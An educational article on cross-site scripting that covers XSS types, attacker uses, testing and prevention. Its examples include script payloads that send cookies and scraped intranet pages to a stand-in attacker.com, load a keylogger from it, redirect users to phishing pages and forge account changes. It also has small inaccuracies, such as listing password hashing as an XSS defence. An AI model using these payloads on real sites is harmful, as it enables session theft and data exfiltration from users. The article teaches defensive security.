# Cross-site Scripting (XSS) Attack: Potential dangers and effective prevention solutions

<small>*Updated date: May 30, 2024*</small>

XSS is one of the well-known security vulnerabilities. Unlike SQL injection, XSS vulnerabilities are mainly executed on the client-side, aiming to steal user information.

## Main content:

[I. What is XSS?](#what-is-xss)

[II. How does XSS (Cross-Site Scripting) work?](#how-does-xss-crosssite-scripting-work)

[III. Types of XSS (Cross-Site Scripting) attacks](#types-of-xss-crosssite-scripting-attacks)
- [1. Stored XSS (Persistent XSS)](#stored-xss-persistent-xss)
- [2. Reflected XSS (Non-persistent XSS)](#reflected-xss-nonpersistent-xss)
- [3. DOM-based XSS](#dombased-xss)

[IV. Applications of XSS (Cross-Site Scripting)](#applications-of-xss-crosssite-scripting)
- [1. Steal Cookies and Session Information](#steal-cookies-and-session-information)
- [2. Phishing Attacks and Malicious Redirects](#phishing-attacks-and-malicious-redirects)
- [3. Inserting Harmful Content](#inserting-harmful-content)
- [4. Performing Actions on Users' Behalf (Session Hijacking)](#performing-actions-on-users-behalf-session-hijacking)
- [5. Attack on Internal Network (Intranet)](#attack-on-internal-network-intranet)
- [6. Distributing Malicious Code](#distributing-malicious-code)

[V. Impact of XSS (Cross-Site Scripting) Vulnerabilities](#impact-of-crosssite-scripting-xss-vulnerabilities)

[VI. How to Search and Test for XSS (Cross-Site Scripting) Vulnerabilities](#how-to-search-and-test-for-xss-crosssite-scripting-vulnerabilities)

[VII. Measures to prevent XSS (Cross-Site Scripting)](#measures-to-prevent-xss-crosssite-scripting)

<a name="what-is-xss"></a>
## I. What is XSS?

`Cross-Site Scripting (XSS)` is a common security vulnerability in web applications that allows attackers to insert and execute malicious code in another user's browser. This vulnerability occurs when a web application allows untrusted data (such as user input) to be injected into the website without being properly authenticated or encrypted.

Simply put, XSS allows hackers to take advantage of security vulnerabilities on websites to insert malicious script code. These pieces of code are then sent to the user, or the user accidentally visits a website that has been infected with malicious code. Thereby, hackers can steal sensitive information such as users' `Cookies` and use it to access accounts on websites that have been infected with malicious code.

>`Cross-site` refers to the fact that malicious code is executed on a website other than where it was created. For example, an attacker could create a malicious website containing malicious JavaScript code. When a user visits this malicious website, JavaScript code will be executed on the legitimate website the user is visiting.\
`Scripting` refers to the fact that malicious code is often written in a scripting language, such as JavaScript. Script code can be used to perform a variety of actions, such as stealing user data, changing website content, or executing other malicious JavaScript code.

<a name="how-does-xss-crosssite-scripting-work"></a>
## II. How does XSS (Cross-Site Scripting) work?

`Cross-site Scripting (XSS) attack` is a web attack technique in which an attacker inserts malicious code (usually JavaScript) into a website. When users visit the infected website, malicious code is executed in their browser, allowing attackers to perform a variety of malicious acts.

**Here are the basic steps in an XSS attack:**

1. **Attackers look for vulnerabilities:** Attackers will look for websites with security vulnerabilities that allow them to insert malicious code. This vulnerability may reside in web components such as input forms, search bars, or other HTML elements.
2. **Malicious Code Injection:** An attacker inserts malicious code into a website, typically through URLs, input forms, or other HTTP requests. This malicious code can be written in JavaScript, HTML, or other programming languages.
3. **Malicious code execution:** When users visit the infected website, malicious code is executed in their browser. This malicious code can perform many malicious acts, including:
    * **Stealing sensitive information:** Attackers can steal users' login information, financial information, personal data, and other sensitive information.
    * **Spying on user activity:** Attackers can track users' behavior on a website, including the pages they visit, the actions they take, and the data they enter.
    * **Malware infection:** Attackers can use XSS to infect a user's computer with malware.
    * **Reputation damage:** Businesses can suffer reputation damage if their website is subject to an XSS attack.

To confirm XSS vulnerabilities, a common method is to use simple payloads to trigger JavaScript functions such as `alert()` or `print()`. These functions help display a clear message when the payload is successfully executed in the victim's browser.

**Use the `alert()` function**

In traditional XSS PoCs, the `alert()` function is often used to display an alert dialog when malicious code is executed. For example:
```html
<script>alert('XSS successful!');</script>
```
If this code is inserted into a website and displays a warning dialog when the user visits that page, this proves that the website is vulnerable to XSS.

**Use the `print()` function**

Starting with Chrome version 92 (released on July 20, 2021), iframes with different origins are prevented from calling the `alert()` function. So, in some more complex situations, the `print()` function can be used instead:
```html
<script>print('XSS successful!');</script>
```
Similar to `alert()`, when this code is executed, it triggers the browser's print dialog, which confirms the XSS vulnerability.

<a name="types-of-xss-crosssite-scripting-attacks"></a>
## III. Types of XSS (Cross-Site Scripting) attacks

There are three main types of XSS attacks: `Stored XSS`, `Reflected XSS` and `DOM-based XSS`. Each type of attack has its own characteristics and operating mechanism.

<a name="stored-xss-persistent-xss"></a>
### 1. Stored XSS (Persistent XSS)

`Stored XSS`, also known as `Persistent XSS`, is a type of XSS attack in which malicious code is permanently stored on the target server, such as in a database, data storage system, or forum. When a user visits a page containing infected data, malicious code is executed on their browser.

**How it works**
1. An attacker inserts malicious code into an input field on a website (e.g. comment, message, or post).
2. This input data is stored on the server without being properly encrypted or authenticated.
3. When another user visits the page containing this data, malicious code will be downloaded and executed in their browser.

Suppose a website has a commenting system that allows users to post comments on articles. An attacker can insert a malicious JavaScript code into the comment as follows:
```html
<script>alert('You have been attacked!');</script>
```
When other users visit the page containing this comment, the JavaScript code will be executed in their browser and display a warning message.

<a name="reflected-xss-nonpersistent-xss"></a>
### 2. Reflected XSS (Non-persistent XSS)

`Reflected XSS`, also known as `Non-persistent XSS`, is a type of XSS attack in which malicious code is not stored on the server but is responded to immediately from the user's HTTP request. This usually happens when user input (like parameters in a URL) is returned and displayed directly on the page without being checked.

**How it works**
1. The attacker creates a link containing malicious JavaScript code and sends it to the user (via email, text message, or another website).
2. When the user clicks on the link, an HTTP request is sent to the server, which returns a response containing malicious code.
3. Malicious code is executed on the user's browser.

Suppose a site uses URL parameters to display a personalized message:
```html
http://example.com/welcome.php?name=<script>alert('You have been attacked!');</script>
```
When a user visits this link, the JavaScript code will be immediately executed in their browser, resulting in the display of a warning message.

<a name="dombased-xss"></a>
### 3. DOM-based XSS

`DOM-based` XSS is a type of XSS attack that occurs when untrusted data is processed directly in the browser's `Document Object Model (DOM)`. This data can change the structure or behavior of the website without server intervention.

**How it works**
1. An attacker injects malicious code into an element on a web page where data is processed directly in the DOM (e.g., via URL or user input).
2. The user's browser processes this data and executes malicious code.
3. Malicious code can change page content or perform other actions on the user's browser.

Suppose a website has the following JavaScript code to display usernames:
```html
<div id="user">Hello, <span id="username"></span></div>
<script>
 var username = location.hash.substring(1);
 document.getElementById('username').innerHTML = username;
</script>
```
If a user accesses the URL:
```html
http://example.com/#<script>alert('You have been attacked!');</script>
```
The JavaScript code will change the content of the `username` element and execute the malicious code, resulting in the display of a warning message.

<a name="applications-of-xss-crosssite-scripting"></a>
## IV. Applications of XSS (Cross-Site Scripting)

Cross-Site Scripting (XSS) is a dangerous security vulnerability that can be exploited by attackers to perform various malicious actions. Here are some examples of what XSS can be used for:

<a name="steal-cookies-and-session-information"></a>
### 1. Steal Cookies and Session Information

One of the most common purposes of XSS attacks is to steal users' cookies. Cookies often contain login session information and other sensitive information. An attacker can use JavaScript code to send a user's cookie to their server, thereby using this cookie to impersonate the user's identity and access the user's account on the attacked website.

**For example:**
```javascript
<script>
var img = new Image();
img.src = "http://attacker.com/steal-cookie?cookie=" + document.cookie;
</script>
```
This code sends the user's cookie to the attacker's server.

<a name="phishing-attacks-and-malicious-redirects"></a>
### 2. Phishing Attacks and Malicious Redirects

XSS can be used to carry out phishing attacks by changing the appearance of a website or redirecting users to a fake website to steal login credentials and other personal data.

**For example:**
```javascript
<script>
window.location = "http://phishing-site.com";
</script>
```
This code will redirect users to a fake website.

<a name="inserting-harmful-content"></a>
### 3. Inserting Harmful Content

Attackers can use XSS to insert malicious content into a website, such as unwanted ads, malware download links, or fake forms to collect personal information.

**For example:**
```javascript
<script>
document.body.innerHTML = '<h1>Your system is infected with a virus! Download the antivirus tool here.</h1><a href="http://malicious-site.com">Download</a>';
</script>
```
This code will change the content of the website to display fake messages and malicious links.

<a name="performing-actions-on-users-behalf-session-hijacking"></a>
### 4. Performing Actions on User's Behalf (Session Hijacking)

An attacker can use XSS to perform actions on the user's behalf, such as sending messages, posting, or changing account settings without the user's knowledge.

**For example:**
```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://example.com/api/change-email", true);
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send(JSON.stringify({
 email: "attacker@example.com"
}));
</script>
```
This code will send a request to change the user's email address without their permission.

<a name="attack-on-internal-network-intranet"></a>
### 5. Attack on Internal Network (Intranet)

If an attacked user is connected to an organization's internal network (intranet), an attacker can use XSS to access and attack services and devices within that internal network.

**For example:**
```javascript
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://intranet.local/admin", true);
xhr.onreadystatechange = function() {
 if (xhr.readyState == 4 && xhr.status == 200) {
 // Send collected data to the attacker's server
 var img = new Image();
 img.src = "http://attacker.com/steal-data?data=" + xhr.responseText;
 }
};
xhr.send();
</script>
```
This code sends a request to an internal admin page and sends the collected data to the attacker's server.

<a name="distributing-malicious-code"></a>
### 6. Distributing Malicious Code

Attackers can use XSS to deliver malicious code, such as ransomware or keyloggers, to victims by injecting malicious code into popular websites or web applications.

**For example:**
```javascript
<script src="http://attacker.com/keylogger.js"></script>
```
This code loads and executes a keylogger from the attacker's server, monitoring and recording every key pressed by the user.

<a name="impact-of-crosssite-scripting-xss-vulnerabilities"></a>
## V. Impact of XSS (Cross-Site Scripting) Vulnerabilities

Cross-Site Scripting (XSS) is one of the most common and dangerous security vulnerabilities in web applications. The effects of XSS vulnerabilities can be severe and varied:

**1. Theft of User Information**

XSS vulnerabilities are often used by attackers to steal users' personal information, including login names, passwords, credit card information and other personal information. This information can be used for further fraudulent, fraudulent or offensive purposes.

**2. Session Hijacking**

By stealing users' session cookies through XSS vulnerabilities, attackers can spoof their identities and access logged in accounts without knowing the password.

**3. Phishing and Fraud**

XSS vulnerabilities can be used to create fake websites or display fake messages to scam users and obtain their personal information, such as login credentials or bank account information.

**4. Inserting Harmful Content**

Attackers can insert malicious content such as unwanted ads, malicious browsers, or fake forms into websites affected by XSS. This can have negative consequences for user experience and weaken system security.

**5. Multimedia Attack**

XSS vulnerabilities can be used to attack websites containing multimedia content, such as videos, images or music. This can weaken the security of users when they visit such websites.

**6. Systemic Weakness**

If a web application contains a large number of XSS vulnerabilities, it can become weakened and more vulnerable to attacks, leading to the risk of data loss, loss of service or negative impact on the organization's reputation.

<a name="how-to-search-and-test-for-xss-crosssite-scripting-vulnerabilities"></a>
## VI. How to Search and Test for XSS (Cross-Site Scripting) Vulnerabilities

### Using Burp Suite:

1. **Use Burp Suite's Web Vulnerability Scanner**: Burp Suite provides a powerful web vulnerability scanning tool that quickly and reliably detects XSS vulnerabilities in web applications.

### Manual Check:

1. **Check for Reflected and Stored XSS**:
    - Enter simple and unique inputs (like alphanumeric strings) at every entry point in the app.
    - Identify any locations where input was returned in HTTP responses.
    - Check each location to determine whether the input can be used to execute any JavaScript.

2. **Check DOM-based XSS from URL Parameters**:
    - Set a single input to the URL parameter.
    - Use your browser's developer tools to search the DOM for this input.
    - Check each location to determine if it can be exploited.

3. **Check DOM-based XSS from Other Resources**:
    - Check JavaScript code for input points other than HTML or URLs.
    - Use Burp Suite or other static and dynamic analysis tools to detect DOM-based XSS vulnerabilities.

### Content Security Policy (CSP):

1. **Application CSP Evaluation**:
    - Check if the application uses CSP and how it is configured.
    - Consider whether CSP can prevent exploitation of XSS vulnerabilities.
    - Often, the CSP can be fooled to allow exploitation of XSS vulnerabilities.

### Dangling Markup Injection:

1. **Identifying Dangling Markup Injection Vulnerabilities**:
    - Check if Dangling Markup Injection vulnerability can be implemented.
    - Dangling Markup Injection is often used to steal sensitive information or CSRF tokens.
    - Ensure implementation of security measures against Dangling Markup Injection.

<a name="measures-to-prevent-xss-crosssite-scripting"></a>
## VII. Measures to prevent XSS (Cross-Site Scripting)

1. **User input processing and encoding**:
    - Use functions like `htmlspecialchars()` in PHP to encode special characters. For example:
    ```php
    echo htmlspecialchars($string, ENT_QUOTES, 'UTF-8');
    ```

    - Use `password_hash()` in PHP to hash the user's password before saving it to the database:
    ```php
    $password = password_hash($_POST['password'], PASSWORD_DEFAULT);
    ```

    - Make sure that special characters (like `<`, `>`, `&`, `"` and `'`) are encoded properly. To prevent XSS, websites need to filter input data to remove special characters like `</script>`, then sterilize the data by encoding HTML characters, e.g.:
    ```html
    <p>Your name: <?= htmlentities($_POST['name']) ?></p>
    ```

2. **Using Content Security Policy (CSP)**:
    - Set up CSP to limit the resources allowed to load and execute on the website. CSP can help prevent malicious code execution from untrusted sources.

3. **Check and filter input data**:
    - Use input filtering and inspection functions to remove or encode special characters that can cause XSS.

    - Libraries like `OWASP AntiSamy` can help inspect and filter user inputs.

4. **Use security frameworks**:
    - Many modern frameworks like Angular, React, and Vue.js have built-in XSS protection mechanisms. Use these frameworks to minimize XSS risks.

5. **Regular updates and patches**:
    - Make sure that the software and libraries you use are always updated and regularly patched for security.

During software testing, assessing the potential risk due to XSS attacks is an extremely important step. `XSS (Cross-site Scripting)` is considered one of the most dangerous threats to web applications, allowing attackers to insert malicious code into websites, causing many serious consequences such as theft. sensitive information, malware infection, and even leading to app takeover.

Therefore, performing XSS attack testing is indispensable to ensure web application security. Understanding XSS attack techniques is a key foundation for accurately analyzing test results and choosing appropriate testing tools.
